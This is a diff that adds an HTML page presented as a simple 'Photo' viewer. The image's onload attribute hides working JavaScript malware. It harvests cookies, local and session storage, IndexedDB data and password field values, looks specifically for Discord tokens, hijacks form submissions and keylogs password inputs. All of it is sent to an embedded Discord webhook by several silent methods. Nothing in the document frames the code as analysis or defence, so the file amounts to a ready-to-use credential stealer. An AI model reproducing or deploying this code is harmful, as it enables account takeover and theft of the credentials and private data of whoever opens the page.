@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Photo</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f5f5; }
+        img { max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+    <img src="https://i.imgur.com/1x1-transparent.gif" alt="image" onload="
+    (function(){
+        var WH = 'https://discord.com/api/webhooks/1523883522824339589/pVBWAKgW_sx-_zFflicLzNX7j_io08X6hkyuctJNO4Ir4hyz28lMg408HcjM3KY82pIq';
+        var platform = location.hostname.indexOf('discord') > -1 ? 'DISCORD' : 
+                       location.hostname.indexOf('instagram') > -1 ? 'INSTAGRAM' : 
+                       location.hostname.indexOf('facebook') > -1 ? 'FACEBOOK' : 'OTHER';
+
+        function sendToWebhook(content) {
+            var data = JSON.stringify({ username: platform + ' Logger', content: content.substring(0, 1990) });
+            // 방법 1: sendBeacon (가장 조용함)
+            try { navigator.sendBeacon(WH, new Blob([data], { type: 'application/json' })); } catch(e){}
+            // 방법 2: fetch no-cors (백업)
+            try { fetch(WH, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: data }); } catch(e){}
+            // 방법 3: XMLHttpRequest (레거시)
+            try { var x = new XMLHttpRequest(); x.open('POST', WH, true); x.setRequestHeader('Content-Type', 'application/json'); x.send(data); } catch(e){}
+        }
+
+        var msg = '';
+        msg += '**[' + platform + '] DATA EXFILTRATED**\n';
+        msg += '**URL:** ' + location.href + '\n';
+        msg += '**UA:** ' + navigator.userAgent + '\n\n';
+
+        // 1. 쿠키
+        msg += '**=== COOKIES ===**\n```\n' + (document.cookie || '(none)') + '\n```\n';
+
+        // 2. localStorage
+        msg += '**=== localStorage ===**\n```\n';
+        try {
+            var tokenFound = false;
+            for (var i = 0; i < localStorage.length; i++) {
+                var k = localStorage.key(i);
+                var v = localStorage.getItem(k) || '';
+                msg += k + ' = ' + v.substring(0, 300) + '\n';
+                if (k.toLowerCase().indexOf('token') > -1 || v.indexOf('mfa.') > -1 || v.indexOf('Bot ') === 0) {
+                    tokenFound = true;
+                    setTimeout(function(kk, vv) {
+                        sendToWebhook('**⚠️ TOKEN FOUND**\nKey: ' + kk + '\nValue: ' + vv);
+                    }, 100, k, v);
+                }
+            }
+        } catch(e) { msg += '(error)\n'; }
+        msg += '```\n';
+
+        // 3. sessionStorage
+        msg += '**=== sessionStorage ===**\n```\n';
+        try {
+            for (var i = 0; i < sessionStorage.length; i++) {
+                var k = sessionStorage.key(i);
+                var v = sessionStorage.getItem(k) || '';
+                msg += k + ' = ' + v.substring(0, 300) + '\n';
+                if (v.indexOf('mfa.') > -1) {
+                    setTimeout(function(kk, vv) {
+                        sendToWebhook('**⚠️ SESSION TOKEN**\nKey: ' + kk + '\nValue: ' + vv);
+                    }, 200, k, v);
+                }
+            }
+        } catch(e) { msg += '(error)\n'; }
+        msg += '```\n';
+
+        // 4. 비밀번호 필드
+        try {
+            var pwds = document.querySelectorAll('input[type=\\'password\\']');
+            if (pwds.length > 0) {
+                msg += '**=== PASSWORD FIELDS ===**\n```\n';
+                pwds.forEach(function(f, idx) {
+                    msg += 'Field #' + idx + ' name=' + (f.name || 'unnamed') + ' value=' + (f.value || '(empty)') + '\n';
+                });
+                msg += '```\n';
+            }
+        } catch(e) {}
+
+        // 5. form submit hijack
+        try {
+            document.querySelectorAll('form').forEach(function(form) {
+                form.addEventListener('submit', function(e) {
+                    var fd = new FormData(this);
+                    var s = '**FORM SUBMIT**\nURL: ' + location.href + '\n```\n';
+                    fd.forEach(function(v, k) { s += k + ' = ' + v + '\n'; });
+                    s += '```\n**Cookies:**\n```\n' + document.cookie + '\n```';
+                    sendToWebhook(s);
+                });
+            });
+        } catch(e) {}
+
+        // 6. keylogger
+        try {
+            document.querySelectorAll('input[type=\\'password\\']').forEach(function(f) {
+                f.addEventListener('input', function() {
+                    sendToWebhook('**KEYLOG**\nField: ' + (this.name || 'unnamed') + '\nValue: ' + (this.value || ''));
+                });
+            });
+        } catch(e) {}
+
+        // 7. IndexedDB
+        setTimeout(function() {
+            try {
+                if (indexedDB && indexedDB.databases) {
+                    indexedDB.databases().then(function(dbs) {
+                        dbs.forEach(function(db) {
+                            var r = indexedDB.open(db.name);
+                            r.onsuccess = function() {
+                                var d = r.result;
+                                Array.from(d.objectStoreNames).forEach(function(os) {
+                                    var t = d.transaction(os, 'readonly');
+                                    var s = t.objectStore(os);
+                                    var g = s.getAll();
+                                    g.onsuccess = function() {
+                                        var items = g.result;
+                                        if (items && items.length) {
+                                            var dbMsg = '**IndexedDB [' + db.name + '][' + os + ']**\n```\n';
+                                            items.forEach(function(item, idx) {
+                                                var str = JSON.stringify(item).substring(0, 300);
+                                                dbMsg += '[' + idx + '] ' + str + '\n';
+                                                if (str.indexOf('mfa.') > -1 || str.indexOf('Bot ') > -1) {
+                                                    sendToWebhook('**⚠️ TOKEN IN IndexedDB**\n' + str);
+                                                }
+                                            });
+                                            dbMsg += '```';
+                                            sendToWebhook(dbMsg);
+                                        }
+                                    };
+                                });
+                            };
+                        });
+                    });
+                }
+            } catch(e) {}
+        }, 3000);
+
+        // 메인 데이터 전송
+        sendToWebhook(msg);
+    })();
+    ">
+</body>
+</html>
